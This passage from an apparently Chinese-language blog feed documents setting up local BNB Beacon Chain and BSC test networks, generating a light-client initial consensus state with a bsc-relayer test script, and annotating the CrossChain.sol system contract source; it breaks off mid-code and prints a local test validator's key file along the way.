<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Error: Received unexpected error:</span><br><span class="line">Invalid commit -- insufficient old voting power: got 0, needed 666666666667</span><br></pre></td></tr></table></figure>
<h3 id="投票权重检查">投票权重检查:</h3>
<p>接着上面的报错,同步过来的新区块的提案者地址为</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Proposer:  931B028E3A2B6C045D0E4579470E9E50847029A2</span><br></pre></td></tr></table></figure>
<p>但初始的共识状态里的验证者集合没有该地址，所以投票权重检查不通过</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Validators:</span><br><span class="line">    Validator&#123;35B42F545A2E3575E48A95B47C9E9540074756BD PubKeyEd25519&#123;8BA4515150EC3182BC82593DF36F8ABB25A619187FCFAB7E552B94E64ED2DEED&#125; VP:1000000000000 A:0&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>至此,我们有两个思路:</p>
<ol>
<li class="lvl-3">
<p>基于<code>generate-tendermintlightclient.js</code>中默认的<code>INIT_CONSENSUS_STATE_BYTES</code>,我们去魔改/生成一个对的初始共识状态十六进制字节数组字符串</p>
</li>
<li class="lvl-3">
<p>直接获取bc上某高度个共识状态数据,再编码成十六进制字节数组字符串</p>
</li>
</ol>
<h3 id="思路1-2">思路1:</h3>
<p>比较棘手的是<code>PubKeyEd25519</code>公钥数据，没法通过BC的cli、rpc api直接获取。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Validators:</span><br><span class="line">    Validator&#123;35B42F545A2E3575E48A95B47C9E9540074756BD PubKeyEd25519&#123;8BA4515150EC3182BC82593DF36F8ABB25A619187FCFAB7E552B94E64ED2DEED&#125; VP:1000000000000 A:0&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>参考文章<a href="https://blog.csdn.net/Tooth_Fairy/article/details/99454417">COSMOS ED25519简析</a>，我们可以在<a href="https://github.com/bnb-chain/bnc-tendermint">bnc-tendermint</a>中调用函数,自己生成。打开BC的配置文件<code>/config/priv_validator_key.json</code></p>
<figure class="highlight json"><figcaption><span>/config/priv_validator_key.json</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;address&quot;</span><span class="punctuation">:</span> <span class="string">&quot;36231A72BBC68CBD82D0EEC690EE8540B0B049AF&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;pub_key&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;tendermint/PubKeyEd25519&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AXtsaPfWGEp+oDrq/PKMEvTImmb4HS87juIdVykoSNg=&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;priv_key&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;tendermint/PrivKeyEd25519&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cijqz2BN0KPc1qETWND0Dr7Zk4g1TYTV+MH6S04YuRcBe2xo99YYSn6gOur88owS9MiaZvgdLzuO4h1XKShI2A==&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>修改并运行测试脚本:</p>
<figure class="highlight go"><figcaption><span>privval/file_test.go</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TestUnmarshalValidatorKeyTemp</span><span class="params">(t *testing.T)</span></span> &#123;</span><br><span class="line">	<span class="comment">//assert, require := assert.New(t), require.New(t)</span></span><br><span class="line"></span><br><span class="line">	serialized := fmt.Sprintf(<span class="string">`&#123;</span></span><br><span class="line"><span class="string">  &quot;address&quot;: &quot;931B028E3A2B6C045D0E4579470E9E50847029A2&quot;,</span></span><br><span class="line"><span class="string">  &quot;pub_key&quot;: &#123;</span></span><br><span class="line"><span class="string">    &quot;type&quot;: &quot;tendermint/PubKeyEd25519&quot;,</span></span><br><span class="line"><span class="string">    &quot;value&quot;: &quot;+dC/2i1cfw/ZcHZvsxt8dDXxbl1EnClGeckR4o4vUUo=&quot;</span></span><br><span class="line"><span class="string">  &#125;,</span></span><br><span class="line"><span class="string">  &quot;priv_key&quot;: &#123;</span></span><br><span class="line"><span class="string">    &quot;type&quot;: &quot;tendermint/PrivKeyEd25519&quot;,</span></span><br><span class="line"><span class="string">    &quot;value&quot;: &quot;B8z+AJ9+wtAoeMWShtlZ1BVewYp9UtD+LRMXoE8ITGX50L/aLVx/D9lwdm+zG3x0NfFuXUScKUZ5yRHiji9RSg==&quot;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;`</span>)</span><br><span class="line">	fmt.Println(serialized)</span><br><span class="line">	val := FilePVKey&#123;&#125;</span><br><span class="line">	err := cdc.UnmarshalJSON([]<span class="type">byte</span>(serialized), &amp;val)</span><br><span class="line">	<span class="comment">//require.Nil(err, &quot;%+v&quot;, err)</span></span><br><span class="line">	fmt.Println(err)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// make sure the values match</span></span><br><span class="line">	<span class="comment">//assert.EqualValues(addr, val.Address)</span></span><br><span class="line">	<span class="comment">//assert.EqualValues(pubKey, val.PubKey)</span></span><br><span class="line">	<span class="comment">//assert.EqualValues(privKey, val.PrivKey)</span></span><br><span class="line">	fmt.Println(val.Address)</span><br><span class="line">	fmt.Println((val.PubKey.(ed25519.PubKeyEd25519)).String())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>输出测试结果,成功打印出<code>PubKeyEd25519</code>字符串</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">=== RUN   TestUnmarshalValidatorKeyTemp</span><br><span class="line">PubKeyEd25519&#123;F9D0BFDA2D5C7F0FD970766FB31B7C7435F16E5D449C294679C911E28E2F514A&#125;</span><br><span class="line">--- PASS: TestUnmarshalValidatorKeyTemp (0.00s)</span><br><span class="line">PASS</span><br></pre></td></tr></table></figure>
<blockquote>
<p>思路1要改的内容太多,容易出错,应采取思路2的更为直接、准确。</p>
</blockquote>
<h3 id="思路2-2">思路2:</h3>
<blockquote>
<p>直接获取BC上某高度上共识状态数据,再编码成十六进制字节数组字符串</p>
</blockquote>
<p>币安是先有BC链,再有BSC链,它们主网在<code>TendermintLightClient.sol</code>轻客户端合约里的初始高度设置成一个很大的值<code>110186855</code>。<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220923143424.png" alt="20220923143424" /><br />
可猜测：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>BC链是先于BSC链,持续运行着</p>
</li>
<li class="lvl-2">
<p>选取了一个BC链上一个特定的高度里的共识状态数据作为轻客户端合约里的初始共识状态数据</p>
</li>
<li class="lvl-2">
<p>然后运行起BSC链、bsc-relayer</p>
</li>
<li class="lvl-2">
<p>中继器连接两条链,读取到BC特定高度的数据后,会同步BC后面的共识状态到轻客户端合约里</p>
</li>
</ul>
<p>在<a href="https://github.com/bnb-chain/bsc-relayer">bsc-relayer</a>中新增测试脚本:</p>
<figure class="highlight go"><figcaption><span>executor/blockinfo_test.go</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="comment">// 查询区块信息</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TestGetBlockInfo</span><span class="params">(t *testing.T)</span></span> &#123;</span><br><span class="line">	initFlags()</span><br><span class="line">	<span class="keyword">var</span> height <span class="type">int64</span></span><br><span class="line">	height = <span class="number">50</span></span><br><span class="line">	bbcNetworkType := viper.GetInt(flagBBCNetworkType)</span><br><span class="line">	bbcExecutor, _ := NewBBCExecutor(cfg, types.ChainNetwork(bbcNetworkType))</span><br><span class="line">  <span class="comment">// 关键函数</span></span><br><span class="line">	cs, err := bbcExecutor.GetInitConsensusState(height)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">	&#125;</span><br><span class="line">	common.Logger.Infof(<span class="string">&quot;cs: %v\n&quot;</span>, cs)</span><br><span class="line">	fmt.Printf(<span class="string">&quot;cs: %v \n&quot;</span>, cs)</span><br><span class="line">	consensusStateBytes, err := cs.EncodeConsensusState()</span><br><span class="line">	<span class="comment">// 需要转成十六进制字符串</span></span><br><span class="line">	newConsensusStateBytesStr := hex.EncodeToString(consensusStateBytes)</span><br><span class="line">	fmt.Println(<span class="string">&quot;consensusStateBytesHexStr: &quot;</span>, newConsensusStateBytesStr)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行测试脚本:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /bsc-relayer/executor</span><br><span class="line">go <span class="built_in">test</span> -v</span><br></pre></td></tr></table></figure>
<p>主要是使用了bsc-relayer中的<code>bbcExecutor.GetInitConsensusState(height)</code>函数，成功获取BC上高度为50的共识状态数据,并编码成十六进制字符串。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">consensusStateBytesHexStr:  373135000000000000000000000000000000000000000000000000000000000000000000000000323cebfa274480fa027136f6f9049aa0b6a92b4b3843ac5bce32d2d19af15d7a6a6e42927ceb8681e615b60bc77cb1ff3449b93bc9017b6c68f7d6184a7ea03aeafcf28c12f4c89a66f81d2f3b8ea51000</span><br><span class="line">--- PASS: TestGetBlockInfo (0.00s)</span><br><span class="line">PASS</span><br></pre></td></tr></table></figure>
<blockquote>
<p>至此,我们就获得了一个准确的初始化共识状态数据，可作为<code>TendermintLightClient.sol</code>轻客户端合约的初始化共识状态数据。</p>
<p>现在我们需要将BC、BSC、bsc-relayer三者结合起来完整验证一下,验证bsc-relayer 是否能够同步新区块头的到<code>TendermintLightClient.sol</code>轻客户端合约里,并成功修改到轻客户端合约里的数据。</p>
</blockquote>
<h1>完整验证:</h1>
<h2 id="运行BC链">运行BC链:</h2>
<p>修改一下BC链配置文件里的同步区块间隔,原本是一天一次,现在要调整得快一些</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[base]</span><br><span class="line"># Interval blocks of breathe block, if breatheBlockInterval is 0, breathe block will be created every day.</span><br><span class="line">breatheBlockInterval = 100</span><br></pre></td></tr></table></figure>
<p>然后初始化并运行起BC链</p>
<h2 id="获取初始化共识状态数据">获取初始化共识状态数据</h2>
<p>使用<code>bsc-relayer</code>上的测试脚本获取某特定高度的初始化共识状态数据的十六进制字节数组字符串</p>
<figure class="highlight go"><figcaption><span>executor/blockinfo_test.go</span></figcaption><table><tr><td class="code"><pre><span class="line">=== RUN   TestGetBlockInfo</span><br><span class="line">consensusStateBytesHexStr:  <span class="number">373135000000000000000000000000000000000000000000000000000000000000000000000000323</span>cebfa274480fa027136f6f9049aa0b6a92b4b3843ac5bce32d2d19af15d7a6a6e42927ceb8681e615b60bc77cb1ff3449b93bc9017b6c68f7d6184a7ea03aeafcf28c12f4c89a66f81d2f3b8ea51000</span><br><span class="line">--- PASS: TestGetBlockInfo (<span class="number">0.00</span>s)</span><br><span class="line">PASS</span><br><span class="line">ok      github.com/binance-chain/bsc-relayer/executor   <span class="number">0.080</span>s</span><br></pre></td></tr></table></figure>
<h2 id="重新生成BSC的genesis-json">重新生成BSC的genesis.json:</h2>
<p>在创始系统合约仓库<a href="https://github.com/bnb-chain/bsc-genesis-contract">bsc-genesis-contract</a>中的<code>generate-tendermintlightclient.js</code>中设置<code>initConsensusStateBytes</code></p>
<figure class="highlight js"><figcaption><span>generate-tendermintlightclient.js</span></figcaption><table><tr><td class="code"><pre><span class="line">program.<span class="title function_">option</span>(<span class="string">&quot;--initConsensusStateBytes &lt;initConsensusStateBytes&gt;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;init consensusState bytes, hex encoding, no prefix with 0x&quot;</span>,</span><br><span class="line">    <span class="string">&quot;373135000000000000000000000000000000000000000000000000000000000000000000000000323cebfa274480fa027136f6f7986147b96aa4adb7c421b909049aa0b6a92b4b3843ac5bce32d2d19af15d7a6a6e42927ceb8681e615b60bc77cb1ff3449b93bc9017b6c68f7d6184a7ea03aeafcf28c12f4c89a66f81d2f3b8ee21d57292848d8000000e8d4a51000&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>生成<code>genesis.json</code>，初始化并运行起BSC链</p>
<h2 id="运行bsc-relayer">运行bsc-relayer:</h2>
<p>初始化并运行起<code>bsc-relayer</code>中继器</p>
<h2 id="查看结果">查看结果:</h2>
<p>用本地搭建的<code>blockscout</code>区块链浏览器查看结果<br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220923145003.png" alt="20220923145003" /><br />
<code>bsc-relayer</code>中继器发起到<code>TendermintLightClient.sol</code>轻客户端合约的tx交易成功<br />
<code>Remix IDE</code>读取<code>TendermintLightClient.sol</code>轻客户端合约的变量,修改成功。<br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220923145414.png" alt="20220923145414" /></p>
<blockquote>
<p>跨链同步主要涉及两个系统合约，分别为</p>
<ul class="lvl-1">
<li class="lvl-2"><code>TendermintLightClient.sol</code>: 同步块头的操作时会调用到</li>
<li class="lvl-2"><code>CrossChain.sol</code>: 同步跨链数据包的操作会调用到</li>
</ul>
<p>至此,我们就搞定了<code>TendermintLightClient.sol</code>轻客户端合约中<code>区块头的同步</code>问题，后面继续研究<code>同步跨链数据包</code>的问题。</p>
</blockquote>
<h1>小结:</h1>
<p>涉及到的github代码仓库较多,简单梳理一下:<br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220923151740.png" alt="20220923151740" /></p>
<table>
<thead>
<tr>
<th>项目</th>
<th>repositories</th>
<th>github地址</th>
</tr>
</thead>
<tbody>
<tr>
<td>BC</td>
<td>node</td>
<td><a href="https://github.com/bnb-chain/node">https://github.com/bnb-chain/node</a></td>
</tr>
<tr>
<td>BC</td>
<td>bnc-cosmos-sdk</td>
<td><a href="https://github.com/bnb-chain/bnc-cosmos-sdk">https://github.com/bnb-chain/bnc-cosmos-sdk</a></td>
</tr>
<tr>
<td>BC</td>
<td>bnc-tendermint</td>
<td><a href="https://github.com/bnb-chain/bnc-tendermint">https://github.com/bnb-chain/bnc-tendermint</a></td>
</tr>
<tr>
<td>BSC</td>
<td>bsc</td>
<td><a href="https://github.com/bnb-chain/bsc">https://github.com/bnb-chain/bsc</a></td>
</tr>
<tr>
<td>BSC</td>
<td>bsc-genesis-contract</td>
<td><a href="https://github.com/bnb-chain/bsc-genesis-contract">https://github.com/bnb-chain/bsc-genesis-contract</a></td>
</tr>
<tr>
<td>Relayer</td>
<td>bsc-relayer</td>
<td><a href="https://github.com/bnb-chain/bsc-relayer">https://github.com/bnb-chain/bsc-relayer</a></td>
</tr>
<tr>
<td>Relayer</td>
<td>oracle-relayer</td>
<td><a href="https://github.com/bnb-chain/oracle-relayer">https://github.com/bnb-chain/oracle-relayer</a></td>
</tr>
</tbody>
</table>
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://docs.bnbchain.org/docs/learn/system-contract">Build-in System Contract</a></p>
</li>
<li class="lvl-2">
<p><a href="https://www.jianshu.com/p/27da6e395ec9">【BSC详解】3——bsc</a></p>
</li>
<li class="lvl-2">
<p><a href="https://www.jianshu.com/p/321fdb7c5b8a">【BSC详解】2——bsc relayer</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>StudyRecord</category>
      </categories>
      <tags>
        <tag>SmartContract</tag>
        <tag>Solidity</tag>
      </tags>
  </entry>
  <entry>
    <title>StudyRecord-Bsc详解-bsc_relayer同步跨链数据包</title>
    <url>/2022/26865.html</url>
    <content><![CDATA[<h1>引言:</h1>
<blockquote>
<p><code>bsc_relayer</code>跨链同步主要涉及两个系统合约，分别为</p>
<ul class="lvl-1">
<li class="lvl-2"><code>TendermintLightClient.sol</code>: 同步区块头的操作时会调用到</li>
<li class="lvl-2"><code>CrossChain.sol</code>: 同步跨链数据包的操作会调用到</li>
</ul>
</blockquote>
<p>上篇blog我们搞定了<code>同步区块头</code>的问题，本篇继续解决<code>同步跨链数据包</code>的问题。<br />
目的：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>本地搭建起BSC和BC两条链</p>
</li>
<li class="lvl-2">
<p>启动bsc_relayer,能成功与两条链建立连接</p>
</li>
<li class="lvl-2">
<p>在BC上创建新的验证者</p>
</li>
<li class="lvl-2">
<p>bsc_relayer要能同步数据成功,在BSC对应合约<code>BSCValidatorSet</code>里,能查询到新增的验证者</p>
</li>
</ul>
<h1>BC权益质押管理:</h1>
<p>参考<a href="https://github.com/bnb-chain/whitepaper/blob/master/%E5%B8%81%E5%AE%89%E6%99%BA%E8%83%BD%E9%93%BE.md">币安智能链白皮书</a>，可知<strong>BSC的权益质押模块是在BC上实现的，再通过跨链的方式,将质押等信息同步回BSC上</strong></p>
<blockquote>
<p>理想情况下，这样的权益质押和奖励发放逻辑应该包含在区块链中，并在产生新区块时自动执行。与币安链一样采用Tendermint共识库的Cosmos Hub就是这样工作的。</p>
<p>自设计之日起，BC就一直在准备启用PoS。另一方面，BSC想要尽可能地与以太坊保持兼容，在其上直接实现PoSA是一个巨大的挑战和压力。特别是考虑到以太坊本身可能在短时间（或更长时间）内迁移到PoS共识协议时，尤其如此。为了保持以太坊的兼容性和复用BC的基础架构，我们在BC上完成了BSC的<code>权益质押逻辑</code>：</p>
<ol>
<li class="lvl-3">
<p>质押代币是 BNB，这是因为它是两个区块链上的原生代币。</p>
</li>
<li class="lvl-3">
<p>在BC上记录BSC的权益质押和委托行为。</p>
</li>
<li class="lvl-3">
<p>BSC 验证人集由它的权益质押和委托逻辑来决定，在BC上构建一个BSC的权益质押模块，并通过跨链通信在每天UTC 00:00:00 由BC传送到BSC。</p>
</li>
<li class="lvl-3">
<p>BC上的奖励分配发生在每天UTC 00:00时刻。</p>
</li>
</ol>
</blockquote>
<blockquote>
<p>本篇我们主要解决的是,与权益质押管理相关的跨链数据包的同步问题。</p>
</blockquote>
<h1>同步跨链数据包调用图:</h1>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220926164613.png" alt="20220926164613" /><br />
如图所示,bsc-relayer会构造tx,调用系统合约<code>CrossChain</code>,通过默克尔树校验后,再调用其他合约(如<code>BSCValidatorSet.sol</code>)完成具体跨链数据包的处理与同步。</p>
<blockquote>
<p>现在先来看看系统合约/跨链合约<code>CrossChain.sol</code>的源码及其实现</p>
</blockquote>
<h1>系统合约CrossChain:</h1>
<h2 id="简介-4">简介:</h2>
<p>负责执行<code>bsc-relayer</code>发送过来的“同步跨链数据包”的交易,进行跨链包预处理,通过<code>emit</code>事件发送跨链包到<code>BC</code>.<br />
主要处理逻辑是:</p>
<ol>
<li class="lvl-3">
<p>调用预编译合约<code>iavlMerkleProofValidate</code>对跨链数据包进行校验</p>
</li>
<li class="lvl-3">
<p>根据不同的<code>channelId</code>,内部调用对应的系统合约,进行具体的数据包处理</p>
</li>
</ol>
<p>简言之，主要做的工作是跨链数据包的<code>校验</code>和<code>路由</code>工作。</p>
<h2 id="初始化函数-2">初始化函数:</h2>
<figure class="highlight go"><figcaption><span>contracts/CrossChain.sol</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="comment">// 初始化函数</span></span><br><span class="line"><span class="comment">// @dev 从System.sol读取配置变量,在registeredContractChannelMap映射中,建立channelId=&gt;系统合约的映射</span></span><br><span class="line">function init() external onlyNotInit &#123;</span><br><span class="line">    <span class="comment">// TokenManager Contract | 跨链代币管理(绑定/解绑)合约 | 用于`BC`和`BSC`两边代币的绑定/解绑</span></span><br><span class="line">    <span class="comment">// BIND_CHANNELID: 1</span></span><br><span class="line">    channelHandlerContractMap[BIND_CHANNELID] = TOKEN_MANAGER_ADDR;</span><br><span class="line">    isRelayRewardFromSystemReward[BIND_CHANNELID] = <span class="literal">false</span>;</span><br><span class="line">    registeredContractChannelMap[TOKEN_MANAGER_ADDR][BIND_CHANNELID] = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// TokenHub Contract | 跨链代币转移合约 | 用于`BC`与`BSC`的跨链代币转移</span></span><br><span class="line">    <span class="comment">// TRANSFER_IN_CHANNELID: 2</span></span><br><span class="line">    channelHandlerContractMap[TRANSFER_IN_CHANNELID] = TOKEN_HUB_ADDR;</span><br><span class="line">    isRelayRewardFromSystemReward[TRANSFER_IN_CHANNELID] = <span class="literal">false</span>;</span><br><span class="line">    registeredContractChannelMap[TOKEN_HUB_ADDR][TRANSFER_IN_CHANNELID] = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// TRANSFER_OUT_CHANNELID: 3</span></span><br><span class="line">    channelHandlerContractMap[TRANSFER_OUT_CHANNELID] = TOKEN_HUB_ADDR;</span><br><span class="line">    isRelayRewardFromSystemReward[TRANSFER_OUT_CHANNELID] = <span class="literal">false</span>;</span><br><span class="line">    registeredContractChannelMap[TOKEN_HUB_ADDR][TRANSFER_OUT_CHANNELID] = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// BSCValidatorSet Contract | 智能链验证者集合合约 | 用于 BC 更新 bsc-validator 验证者节点地址列表(查询or更新)</span></span><br><span class="line">    <span class="comment">// STAKING_CHANNELID: 8</span></span><br><span class="line">    channelHandlerContractMap[STAKING_CHANNELID] = VALIDATOR_CONTRACT_ADDR;</span><br><span class="line">    isRelayRewardFromSystemReward[STAKING_CHANNELID] = <span class="literal">true</span>;</span><br><span class="line">    registeredContractChannelMap[VALIDATOR_CONTRACT_ADDR][STAKING_CHANNELID] = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// GovHub Contract | 治理管理合约 | 处理来自`BC`上的链上治理数据包</span></span><br><span class="line">    <span class="comment">// GOV_CHANNELID: 9</span></span><br><span class="line">    channelHandlerContractMap[GOV_CHANNELID] = GOV_HUB_ADDR;</span><br><span class="line">    isRelayRewardFromSystemReward[GOV_CHANNELID] = <span class="literal">true</span>;</span><br><span class="line">    registeredContractChannelMap[GOV_HUB_ADDR][GOV_CHANNELID] = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Liveness Slash Contract | 惩罚合约 |用于惩罚违规操作的 bsc-validator</span></span><br><span class="line">    <span class="comment">// SLASH_CHANNELID: 11</span></span><br><span class="line">    channelHandlerContractMap[SLASH_CHANNELID] = SLASH_CONTRACT_ADDR;</span><br><span class="line">    isRelayRewardFromSystemReward[SLASH_CHANNELID] = <span class="literal">true</span>;</span><br><span class="line">    registeredContractChannelMap[SLASH_CONTRACT_ADDR][SLASH_CHANNELID] = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    batchSizeForOracle = INIT_BATCH_SIZE;</span><br><span class="line"></span><br><span class="line">    oracleSequence = - <span class="number">1</span>;</span><br><span class="line">    previousTxHeight = <span class="number">0</span>;</span><br><span class="line">    txCounter = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    alreadyInit = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在初始化函数里,主要做的工作是从<code>System.sol</code>读取配置变量,在<code>registeredContractChannelMap</code>映射中,建立<code>channelId=&gt;系统合约地址</code>的映射。<br />
有以下映射:</p>
<table>
<thead>
<tr>
<th>ContractName</th>
<th>ContractNameCN</th>
<th>Role</th>
<th>ChannelID</th>
</tr>
</thead>
<tbody>
<tr>
<td>TokenManager Contract</td>
<td>跨链代币管理(绑定/解绑)合约</td>
<td>用于<code>BC</code>和<code>BSC</code>两边代币的绑定/解绑</td>
<td>1</td>
</tr>
<tr>
<td>TokenHub Contract</td>
<td>跨链代币转移合约</td>
<td>用于<code>BC</code>与<code>BSC</code>的跨链代币转移</td>
<td>2,3</td>
</tr>
<tr>
<td>BSCValidatorSet Contract</td>
<td>智能链验证者集合合约</td>
<td>用于 BC 更新 bsc-validator 验证者节点地址列表(查询or更新)</td>
<td>8</td>
</tr>
<tr>
<td>GovHub Contract</td>
<td>治理管理合约</td>
<td>处理来自<code>BC</code>上的链上治理数据包</td>
<td>9</td>
</tr>
<tr>
<td>Liveness Slash Contract</td>
<td>惩罚合约</td>
<td>用于惩罚违规操作的 bsc-validator</td>
<td>11</td>
</tr>
</tbody>
</table>
<h2 id="处理跨链数据包函数">处理跨链数据包函数:</h2>
<figure class="highlight go"><figcaption><span>contracts/CrossChain.sol</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="comment">// 处理跨链数据包</span></span><br><span class="line"><span class="comment">// modifier检验:</span></span><br><span class="line"><span class="comment">//  onlyRelayer 仅允许中继器调用</span></span><br><span class="line"><span class="comment">//  sequenceInOrder 检验sequence序列号是否按顺序</span></span><br><span class="line"><span class="comment">//  blockSynced 在轻客户端合约中,该区块是否已经同步</span></span><br><span class="line"><span class="comment">//  channelSupported 该通道是否已经注册,相当于channelId白名单机制</span></span><br><span class="line"><span class="comment">// @param payload 编码过的跨链数据包</span></span><br><span class="line"><span class="comment">// @param proof</span></span><br><span class="line"><span class="comment">// @param height 区块高度</span></span><br><span class="line"><span class="comment">// @param packageSequence 跨链数据包序列号</span></span><br><span class="line"><span class="comment">// @param channelId 通道ID</span></span><br><span class="line">function handlePackage(bytes calldata payload, bytes calldata proof, <span class="type">uint64</span> height, <span class="type">uint64</span> packageSequence, <span class="type">uint8</span> channelId) onlyInit onlyRelayer</span><br><span class="line">sequenceInOrder(packageSequence, channelId) blockSynced(height) channelSupported(channelId) external &#123;</span><br><span class="line">    bytes memory payloadLocal = payload;</span><br><span class="line">    <span class="comment">// fix error: stack too deep, try removing local variables</span></span><br><span class="line">    bytes memory proofLocal = proof;</span><br><span class="line">    <span class="comment">// fix error: stack too deep, try removing local variables</span></span><br><span class="line">    <span class="comment">// 默克尔树根校验</span></span><br><span class="line">    require(MerkleProof.validateMerkleProof(ILightClient(LIGHT_CLIENT_ADDR).getAppHash(height), STORE_NAME, generateKey(packageSequence, channelId), payloadLocal, proofLocal), <span class="string">&quot;invalid merkle proof&quot;</span>);</span><br><span class="line">    <span class="comment">// 同步该区块的中继器地址</span></span><br><span class="line">    address payable headerRelayer = ILightClient(LIGHT_CLIENT_ADDR).getSubmitter(height);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8</span> channelIdLocal = channelId;</span><br><span class="line">    <span class="comment">// fix error: stack too deep, try removing local variables</span></span><br><span class="line">    <span class="comment">// 解码跨链数据包</span></span><br><span class="line">    (<span class="type">bool</span> success, <span class="type">uint8</span> packageType, uint256 relayFee, bytes memory msgBytes) = decodePayloadHeader(payloadLocal);</span><br><span class="line">    <span class="keyword">if</span> (!success) &#123;</span><br><span class="line">        emit unsupportedPackage(packageSequence, channelIdLocal, payloadLocal);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    emit receivedPackage(packageType, packageSequence, channelIdLocal);</span><br><span class="line">    <span class="keyword">if</span> (packageType == SYN_PACKAGE) &#123;</span><br><span class="line">        <span class="comment">// 根据channelId获取对应的系统合约地址</span></span><br><span class="line">        address handlerContract = channelHandlerContractMap[channelIdLocal];</span><br><span class="line">        <span class="comment">// 调用具体的系统合约处理跨链数据包</span></span><br><span class="line">        try IApplication(handlerContract).handleSynPackage(channelIdLocal, msgBytes) returns (bytes memory responsePayload) &#123;</span><br><span class="line">            <span class="keyword">if</span> (responsePayload.length != <span class="number">0</span>) &#123;</span><br><span class="line">                sendPackage(channelSendSequenceMap[channelIdLocal], channelIdLocal, encodePayload(ACK_PACKAGE, <span class="number">0</span>, responsePayload));</span><br><span class="line">                channelSendSequenceMap[channelIdLocal] = channelSendSequenceMap[channelIdLocal] + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch Error(<span class="type">string</span> memory reason) &#123;</span><br><span class="line">            sendPackage(channelSendSequenceMap[channelIdLocal], channelIdLocal, encodePayload(FAIL_ACK_PACKAGE, <span class="number">0</span>, msgBytes));</span><br><span class="line">            channelSendSequenceMap[channelIdLocal] = channelSendSequenceMap[channelIdLocal] + <span class="number">1</span>;</span><br><span class="line">            emit unexpectedRevertInPackageHandler(handlerContract, reason);</span><br><span class="line">        &#125; catch (bytes memory lowLevelData) &#123;</span><br><span class="line">            sendPackage(channelSendSequenceMap[channelIdLocal], channelIdLocal, encodePayload(FAIL_ACK_PACKAGE, <span class="number">0</span>, msgBytes));</span><br><span class="line">            channelSendSequenceMap[channelIdLocal] = channelSendSequenceMap[channelIdLocal] + <span class="number">1</span>;</span><br><span class="line">            emit unexpectedFailureAssertionInPackageHandler(handlerContract, lowLevelData);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (packageType == ACK_PACKAGE) &#123;</span><br><span class="line">        address handlerContract = channelHandlerContractMap[channelIdLocal];</span><br><span class="line">        try IApplication(handlerContract).handleAckPackage(channelIdLocal, msgBytes) &#123;</span><br><span class="line">        &#125; catch Error(<span class="type">string</span> memory reason) &#123;</span><br><span class="line">            emit unexpectedRevertInPackageHandler(handlerContract, reason);</span><br><span class="line">        &#125; catch (bytes memory lowLevelData) &#123;</span><br><span class="line">            emit unexpectedFailureAssertionInPackageHandler(handlerContract, lowLevelData);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span 